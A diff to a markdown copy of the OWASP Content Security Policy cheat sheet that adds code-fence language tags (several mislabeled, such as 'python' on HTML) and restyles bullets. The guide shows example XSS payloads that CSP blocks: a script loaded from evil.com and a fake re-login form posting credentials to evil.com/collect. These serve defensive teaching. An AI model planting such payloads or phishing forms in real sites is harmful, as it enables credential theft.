@@ -23,7 +23,7 @@ CSP defends against XSS attacks in the following ways:
 
 By preventing the page from executing inline scripts, attacks like injecting
 
-```
+```python
 <script>document.body.innerHTML='defaced'</script>
 ```
 
@@ -33,7 +33,7 @@ will not work.
 
 By preventing the page from loading scripts from arbitrary servers, attacks like injecting
 
-```
+```python
 <script src="https://evil.com/hacked.js"></script>
 ```
 
@@ -43,7 +43,7 @@ will not work.
 
 By preventing the page from executing text-to-JavaScript functions like `eval`, the website will be safe from vulnerabilities like this:
 
-```
+```javascript
 // A Simple Calculator
 var op1 = getUrlParameter("op1");
 var op2 = getUrlParameter("op2");
@@ -55,7 +55,7 @@ console.log(`The sum is: ${sum}`);
 
 By restricting where HTML forms on your website can submit their data, injecting phishing forms won't work either.
 
-```
+```bash
 <form method="POST" action="https://evil.com/collect">
 <h3>Session expired! Please login again.</h3>
 <label>Username</label>
@@ -96,7 +96,7 @@ You can deliver a Content Security Policy to your website in three ways.
 
 Send a Content-Security-Policy HTTP response header from your web server.
 
-```
+```bash
 Content-Security-Policy: ...
 ```
 
@@ -106,7 +106,7 @@ Using a header is the preferred way and supports the full CSP feature set. Send 
 
 Using the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.
 
-```
+```php
 Content-Security-Policy-Report-Only: ...
 ```
 
@@ -120,7 +120,7 @@ Sometimes you cannot use the Content-Security-Policy header if you are, e.g., De
 
 In this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:
 
-```
+```php
 <meta http-equiv="Content-Security-Policy" content="...">
 ```
 
@@ -130,9 +130,9 @@ Almost everything is still supported, including full XSS defenses. However, you 
 
 The following are headers for CSP.
 
-* `Content-Security-Policy` : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+
-* `Content-Security-Policy-Report-Only` : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking ("fail open") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive. This is often used as a precursor to utilizing CSP in blocking mode ("fail closed")
-* `DO NOT` use X-Content-Security-Policy or X-WebKit-CSP. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.
+- `Content-Security-Policy` : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+
+- `Content-Security-Policy-Report-Only` : W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking ("fail open") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive. This is often used as a precursor to utilizing CSP in blocking mode ("fail closed")
+- `DO NOT` use X-Content-Security-Policy or X-WebKit-CSP. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.
 
 ### CSP Directives[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#csp-directives) <a href="#csp-directives" id="csp-directives"></a>
 
@@ -144,55 +144,55 @@ Fetch directives tell the browser the locations to trust and load resources from
 
 Most fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.
 
-* `child-src` allows the developer to control nested browsing contexts and worker execution contexts.
-* `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.
-* `font-src` specifies which URLs to load fonts from.
-* `img-src` specifies the URLs that images can be loaded from.
-* `manifest-src` specifies the URLs that application manifests may be loaded from.
-* `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.
-* `prefetch-src` specifies the URLs from which resources can be prefetched from.
-* `object-src` specifies the URLs from which plugins can be loaded from.
-* `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.
-  * `script-src-elem` controls the location from which execution of script requests and blocks can occur.
-  * `script-src-attr` controls the execution of event handlers.
-* `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.
-  * `style-src-elem` controls styles except for inline attributes.
-  * `style-src-attr` controls styles attributes.
-* `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.
+- `child-src` allows the developer to control nested browsing contexts and worker execution contexts.
+- `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.
+- `font-src` specifies which URLs to load fonts from.
+- `img-src` specifies the URLs that images can be loaded from.
+- `manifest-src` specifies the URLs that application manifests may be loaded from.
+- `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.
+- `prefetch-src` specifies the URLs from which resources can be prefetched from.
+- `object-src` specifies the URLs from which plugins can be loaded from.
+- `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.
+  - `script-src-elem` controls the location from which execution of script requests and blocks can occur.
+  - `script-src-attr` controls the execution of event handlers.
+- `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.
+  - `style-src-elem` controls styles except for inline attributes.
+  - `style-src-attr` controls styles attributes.
+- `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.
 
 #### Document Directives[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#document-directives) <a href="#document-directives" id="document-directives"></a>
 
 Document directives instruct the browser about the properties of the document to which the policies will apply to.
 
-* `base-uri` specifies the possible URLs that the `<base>` element can use.
-* `plugin-types` limits the types of resources that can be loaded into the document (_e.g._ application/pdf). 3 rules apply to the affected elements, `<embed>` and `<object>`:
-  * The element needs to explicitly declare its type.
-  * The element's type needs to match the declared type.
-  * The element's resource need to match the declared type.
-* `sandbox` restricts a page's actions such as submitting forms.
-  * Only applies when used with the request header `Content-Security-Policy`.
-  * Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`
-  * [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)
+- `base-uri` specifies the possible URLs that the `<base>` element can use.
+- `plugin-types` limits the types of resources that can be loaded into the document (_e.g._ application/pdf). 3 rules apply to the affected elements, `<embed>` and `<object>`:
+  - The element needs to explicitly declare its type.
+  - The element's type needs to match the declared type.
+  - The element's resource need to match the declared type.
+- `sandbox` restricts a page's actions such as submitting forms.
+  - Only applies when used with the request header `Content-Security-Policy`.
+  - Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`
+  - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)
 
 #### Navigation Directives[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#navigation-directives) <a href="#navigation-directives" id="navigation-directives"></a>
 
 Navigation directives instruct the browser about the locations that the document can navigate to.
 
-* `navigate-to` restricts the URLs which a document can navigate to by any mean ([not yet supported](https://caniuse.com/?search=navigate-to) by modern browsers in Jan 2021).
-* `form-action` restricts the URLs which the forms can submit to.
-* `frame-ancestors` restricts the URLs that can embed the requested resource inside of `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.
-  * If this directive is specified in a `<meta>` tag, the directive is ignored.
-  * This directive doesn't fallback to `default-src` directive.
-  * `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.
+- `navigate-to` restricts the URLs which a document can navigate to by any mean ([not yet supported](https://caniuse.com/?search=navigate-to) by modern browsers in Jan 2021).
+- `form-action` restricts the URLs which the forms can submit to.
+- `frame-ancestors` restricts the URLs that can embed the requested resource inside of `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.
+  - If this directive is specified in a `<meta>` tag, the directive is ignored.
+  - This directive doesn't fallback to `default-src` directive.
+  - `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.
 
 #### Reporting Directives[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#reporting-directives) <a href="#reporting-directives" id="reporting-directives"></a>
 
 Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.
 
-* `report-to` which is a groupname defined in the header in a json formatted header value.
-  * [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
-* `report-uri` directive is deprecated by `report-to`, which is a URI that the reports are sent to.
-  * Goes by the format of: `Content-Security-Policy: report-uri https://example.com/csp-reports`
+- `report-to` which is a groupname defined in the header in a json formatted header value.
+  - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)
+- `report-uri` directive is deprecated by `report-to`, which is a URI that the reports are sent to.
+  - Goes by the format of: `Content-Security-Policy: report-uri https://example.com/csp-reports`
 
 In order to ensure backward compatibility, use the 2 directives in conjunction. Whenever a browser supports `report-to`, it will ignore `report-uri`. Otherwise, `report-uri` will be used.
 
@@ -214,7 +214,7 @@ To better understand how the directive sources work, check out the [source lists
 
 When inline scripts are required, the `script-src 'hash_algo-hash'` is one option for allowing only specific scripts to execute.
 
-```
+```php
 Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='
 ```
 
@@ -232,14 +232,14 @@ Using hashes is generally not a very good approach. If you change _anything_ ins
 
 Nonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:
 
-```
+```php
 const nonce = uuid.v4();
 scriptSrc += ` 'nonce-${nonce}'`;
 ```
 
 You would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:
 
-```
+```php
 <script nonce="<%= nonce %>">
     ...
 </script>
@@ -267,18 +267,18 @@ If your application functions with these restrictions, it drastically reduces yo
 
 The most basic policy assumes:
 
-* All resources are hosted by the same domain of the document.
-* There are no inlines or evals for scripts and style resources.
-* There is no need for other websites to frame the website.
-* There are no form-submissions to external websites.
+- All resources are hosted by the same domain of the document.
+- There are no inlines or evals for scripts and style resources.
+- There is no need for other websites to frame the website.
+- There are no form-submissions to external websites.
 
-```
+```python
 Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';
 ```
 
 To tighten further, one can apply the following:
 
-```
+```python
 Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
 ```
 
@@ -288,18 +288,18 @@ This policy allows images, scripts, AJAX, and CSS from the same origin and does 
 
 If the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:
 
-```
+```bash
 Content-Security-Policy: upgrade-insecure-requests;
 ```
 
 #### Preventing framing attacks (clickjacking, cross-site leaks)[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#preventing-framing-attacks-clickjacking-cross-site-leaks) <a href="#preventing-framing-attacks-clickjacking-cross-site-leaks" id="preventing-framing-attacks-clickjacking-cross-site-leaks"></a>
 
-* To prevent all framing of your content use:
-  * `Content-Security-Policy: frame-ancestors 'none';`
-* To allow for the site itself, use:
-  * `Content-Security-Policy: frame-ancestors 'self';`
-* To allow for trusted domain, do the following:
-  * `Content-Security-Policy: frame-ancestors trusted.com;`
+- To prevent all framing of your content use:
+  - `Content-Security-Policy: frame-ancestors 'none';`
+- To allow for the site itself, use:
+  - `Content-Security-Policy: frame-ancestors 'self';`
+- To allow for trusted domain, do the following:
+  - `Content-Security-Policy: frame-ancestors trusted.com;`
 
 #### Strict Policy[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#strict-policy) <a href="#strict-policy" id="strict-policy"></a>
 
@@ -309,16 +309,16 @@ Google went ahead and set up a [guide](https://web.dev/strict-csp) to adopt a st
 
 Based on a [presentation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation?slide=55) at LocoMocoSec, the following two policies can be used to apply a strict policy:
 
-* Moderate Strict Policy:
+- Moderate Strict Policy:
 
-```
+```javascript
 script-src 'nonce-r4nd0m' 'strict-dynamic';
 object-src 'none'; base-uri 'none';
 ```
 
-* Locked down Strict Policy:
+- Locked down Strict Policy:
 
-```
+```javascript
 script-src 'nonce-r4nd0m';
 object-src 'none'; base-uri 'none';
 ```
@@ -327,7 +327,7 @@ object-src 'none'; base-uri 'none';
 
 When `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:
 
-```
+```javascript
 <script>
 var foo = "314"
 <script>
@@ -335,7 +335,7 @@ var foo = "314"
 
 The inline code can be moved to a separate JavaScript file and the code in the page becomes:
 
-```
+```javascript
 <script src="app.js">
 </script>
 ```
@@ -344,26 +344,26 @@ With `app.js` containing the `var foo = "314"` code.
 
 The inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:
 
-```
+```bash
 <button id="button1" onclick="doSomething()">
 ```
 
 This should be replaced by `addEventListener` calls:
 
-```
+```bash
 document.getElementById("button1").addEventListener('click', doSomething);
 ```
 
 ### References[¶](https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html#references) <a href="#references" id="references"></a>
 
-* [Strict CSP](https://web.dev/strict-csp)
-* [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
-* [Content-Security-Policy](https://content-security-policy.com/)
-* [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
-* [CSP Wikipedia](https://en.wikipedia.org/wiki/Content\_Security\_Policy)
-* [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
-* [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
-* [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
-* [CSP Scanner](https://cspscanner.com/)
-* [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)
-* CSP Generator: [Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc)/[Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)
+- [Strict CSP](https://web.dev/strict-csp)
+- [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)
+- [Content-Security-Policy](https://content-security-policy.com/)
+- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
+- [CSP Wikipedia](https://en.wikipedia.org/wiki/Content\_Security\_Policy)
+- [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
+- [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)
+- [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
+- [CSP Scanner](https://cspscanner.com/)
+- [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)
+- CSP Generator: [Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc)/[Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)
